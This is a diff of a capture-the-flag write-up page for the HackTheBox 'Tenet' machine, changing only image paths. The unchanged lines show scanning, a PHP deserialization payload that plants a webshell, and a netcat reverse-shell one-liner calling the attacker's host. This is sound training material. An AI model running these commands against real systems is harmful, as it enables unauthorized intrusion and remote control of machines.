@@ -37,7 +37,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 18.17 seconds
-</code></pre><ul><li>Web server</li></ul><p><img src=./images/1.png></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.223/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js -t 50 --no-error
+</code></pre><ul><li>Web server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tenet/images/1.png></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.223/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js -t 50 --no-error
 
 ===============================================================
 Gobuster v3.6
@@ -59,7 +59,7 @@ Starting gobuster in directory enumeration mode
 /.html                (Status: 403) [Size: 277]
 /users.txt            (Status: 200) [Size: 8]
 /wordpress            (Status: 301) [Size: 316] [--&gt; http://10.10.10.223/wordpress/]
-</code></pre><ul><li><code>wordpress</code> is broken, but reveals <code>vhost</code></li></ul><p><img src=./images/2.png></p><ul><li><code>vhosts</code></li></ul><pre tabindex=0><code>└─$ wfuzz -u http://10.10.10.223/ -H &#39;Host: FUZZ.tenet.htb&#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 964
+</code></pre><ul><li><code>wordpress</code> is broken, but reveals <code>vhost</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tenet/images/2.png></p><ul><li><code>vhosts</code></li></ul><pre tabindex=0><code>└─$ wfuzz -u http://10.10.10.223/ -H &#39;Host: FUZZ.tenet.htb&#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 964
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -74,7 +74,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 000000001:   301        0 L      0 W        0 Ch        &#34;www&#34;                                                                                                                                                                      
 000000689:   400        12 L     53 W       425 Ch      &#34;gc._msdcs&#34;      
-</code></pre><ul><li>Now we can <code>wordpresss</code></li></ul><p><img src=./images/3.png></p><h2 id=foothold>Foothold</h2><ul><li>We could run <code>wpscan</code>, but there is an interesting comment in one of the posts about the migration</li></ul><p><img src=./images/4.png></p><ul><li>If we try to <code>curl</code> <code>sator.php</code> from <code>tenet.htb</code> we receive <code>404</code></li></ul><pre tabindex=0><code>└─$ curl -s tenet.htb/sator.php    
+</code></pre><ul><li>Now we can <code>wordpresss</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tenet/images/3.png></p><h2 id=foothold>Foothold</h2><ul><li>We could run <code>wpscan</code>, but there is an interesting comment in one of the posts about the migration</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tenet/images/4.png></p><ul><li>If we try to <code>curl</code> <code>sator.php</code> from <code>tenet.htb</code> we receive <code>404</code></li></ul><pre tabindex=0><code>└─$ curl -s tenet.htb/sator.php    
 &lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
 &lt;html&gt;&lt;head&gt;
 &lt;title&gt;404 Not Found&lt;/title&gt;
@@ -148,7 +148,7 @@ O:14:&#34;DatabaseExport&#34;:2:{s:9:&#34;user_file&#34;;s:9:&#34;shell.php&#34;
 </code></pre><pre tabindex=0><code>└─$ curl http://10.10.10.223/shell.php?cmd=id                                                                                                                                     
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre><ul><li>Let&rsquo;s get reverse shell</li></ul><pre tabindex=0><code>└─$ curl http://10.10.10.223/shell.php --data-urlencode &#39;cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.4 6666 &gt;/tmp/f&#39;
-</code></pre><p><img src=./images/5.png></p><h2 id=user>User</h2><ul><li><code>wp-config.php</code> contains <code>neil</code>&rsquo;s creds</li></ul><pre tabindex=0><code>&lt;?php
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tenet/images/5.png></p><h2 id=user>User</h2><ul><li><code>wp-config.php</code> contains <code>neil</code>&rsquo;s creds</li></ul><pre tabindex=0><code>&lt;?php
 /**
  * The base configuration for WordPress
  *
